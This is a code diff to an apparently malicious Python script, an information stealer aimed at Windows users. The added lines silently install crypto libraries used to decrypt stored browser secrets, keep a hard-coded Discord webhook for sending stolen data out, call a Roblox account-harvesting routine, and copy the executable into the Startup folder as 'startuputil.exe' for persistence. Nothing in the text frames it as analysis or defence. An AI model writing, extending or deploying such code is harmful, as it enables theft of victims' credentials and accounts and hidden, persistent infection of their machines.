@@ -1,3 +1,30 @@
+import os, sys, subprocess, json, re, base64, datetime, shutil, requests
+import urllib.request, urllib.error, urllib.parse
+
+if os.name != "nt":
+    sys.exit()
+
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call(
+                [sys.executable, "-m", "pip", "install", pip_name],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            os.execv(sys.executable, [sys.executable] + sys.argv[1:])
+
+if not getattr(sys, "frozen", False):
+    install_import([
+        ("win32crypt", "pypiwin32"),
+        ("Crypto.Cipher", "pycryptodome"),
+    ])
+
+import win32crypt
+from Crypto.Cipher import AES
+
 webhook = "https://discord.com/api/webhooks/1572412484722360341/D4UtWHCa8-IXArawpBqEYSM33IPiW-ToHYpobJufbrhE9jgEP1B4R65xogdAWxJBsxNi"
 
 LOCAL = os.getenv("LOCALAPPDATA")
@@ -214,6 +241,13 @@ def roblox(username):
             }],
             })
 
+def copy():
+    startup = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
+    dst = os.path.join(startup, "startuputil.exe")
+    if os.path.isdir(startup) and not os.path.exists(dst):
+        shutil.copy(sys.executable, dst)
+
 if __name__ == "__main__":
     username = main()
     roblox(username)
+    copy()
